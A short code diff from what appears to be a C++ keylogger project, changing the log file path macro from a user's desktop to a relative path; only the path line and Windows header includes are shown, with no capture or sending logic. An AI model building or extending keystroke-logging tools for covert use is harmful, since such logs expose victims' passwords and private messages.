@@ -1,4 +1,4 @@
-#define PATH "C:\\Users\\Tal\\Desktop\\KeyLogger_OUTFILE.txt"  // path to log folder location
+#define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output folder location
 #include <iostream>
 #include <Windows.h>
 #include <time.h>
